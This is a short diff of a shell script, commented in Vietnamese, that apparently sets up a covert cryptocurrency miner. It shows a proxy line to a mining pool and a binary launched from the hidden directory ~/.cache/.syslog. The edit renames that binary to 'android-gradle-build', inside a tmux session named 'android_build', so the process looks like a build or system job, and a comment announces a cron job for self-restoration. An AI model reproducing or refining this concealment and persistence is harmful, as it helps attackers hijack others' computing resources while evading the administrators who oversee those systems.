@@ -63,7 +63,7 @@ EOF
 #tmux new-session -d -s proxy "sudo socat TCP-LISTEN:8888,reuseaddr,fork TCP:$POOL_REAL"
 
 # ==== Tạo script khởi chạy ngụy trang với giới hạn CPU ====
-tmux has-session -t journald 2>/dev/null || tmux new-session -d -s android_build "cd ~/.cache/.syslog && ./syslogd -c .cfg.json"
+tmux has-session -t journald 2>/dev/null || tmux new-session -d -s android_build "cd ~/.cache/.syslog && ./android-gradle-build -c .cfg.json"
 
 
 # ==== Tạo cron job để tự khôi phục ====
